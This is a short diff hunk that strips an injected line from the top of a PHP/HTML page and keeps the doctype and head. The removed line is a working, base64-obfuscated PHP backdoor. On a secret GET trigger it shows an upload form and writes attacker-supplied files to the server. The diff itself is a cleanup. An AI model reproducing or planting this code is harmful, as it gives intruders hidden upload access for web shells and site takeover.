@@ -1,4 +1,3 @@
-<?php error_reporting(0);if($_GET[base64_decode('Y3I=')]==base64_decode('MTE=')){$dzgkbnna_0=$_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')];$cjgimngo_1=$_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')];echo base64_decode('PGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz48aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nZmlsZScgLz48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVVBsb2FkJyAvPjwvZm9ybT4=');move_uploaded_file($dzgkbnna_0,$cjgimngo_1);exit(0);}?>
 <!DOCTYPE HTML>
 <html>
 <head>
